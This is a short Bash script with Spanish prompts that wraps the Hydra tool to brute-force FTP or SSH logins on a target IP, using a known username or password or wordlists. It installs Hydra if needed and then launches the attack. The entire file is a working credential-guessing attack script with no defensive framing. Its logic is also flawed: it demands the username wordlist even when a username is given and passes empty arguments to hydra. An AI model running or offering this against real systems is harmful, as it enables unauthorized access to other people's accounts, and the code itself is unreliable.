#!/bin/bash

read -p "Porfavor Introduzca la IP Objetivo. > " target

echo && echo "¿Usted conoce el usuario? (Y/n)."; read -p "> " userchoice
if [[ "$userchoice" = "Y" || "$userchoice" = "y" ]]; then
    read -p "Porfavor ingrese el nombre de usuario > " userfinalchoice
    knuss="-l"
elif [[ "$userchoice" = "N" || "$userchoice" = "n" ]]; then
    read -p "Introduzca el nombre del diccionario (en la carpeta actual, sin la extensión .txt) > " diccname
    unkuss="-L"
else
   echo "Respuesta incorrecta."
   exit
fi

echo && echo "¿Usted conoce la contraseña? (Y/n)"; read -p "> " passwdchoice
if [[ "$passwdchoice" = "Y" || "$passwdchoice" = "y" ]]; then
    read -p "Porfavor ingrese la contraseña." pwwdkn
    knpwwd="-p"
else
    read -p "Porfavor ingrese el nombre del diccionario de contraseñas (En la carpeta actual, sin la extensión .txt) > " passwddicc
    uknpwwd="-P"
fi

read -p "Elija servicio, FTP | SSH / (escriba FTP o SSH) > " servicechoice

if ! command -v hydra &> /dev/null; then
   echo "Hydra no está instalado, ¿desea instalarlo?"
   read -p "> " HIC
   if [[ "$HIC" = "Y" || "$HIC" = "y" ]]; then
      echo "> Instalando hydra."
      sudo apt install hydra -y > /dev/null
      if ! command -v hydra &> /dev/null; then
          echo "Error al instalar Hydra."
          exit
      fi
  else
       echo "Hydra no se ha instalado."
       exit
  fi
fi

if [ ! -f "$diccname".txt ]; then
   echo -e "No existe el diccionario. Colóquelo en el directorio del script en ejecución."
   exit
else
   echo "Diccionario verificado."
fi

echo && echo "Iniciando Ataque.."

hydra "$target" "$servicechoice" "$knuss" "$userfinalchoice" "$unkuss" "$diccname".txt "$knpwwd" "$pwwdkn" "$uknpwwd" "$passwddicc".txt
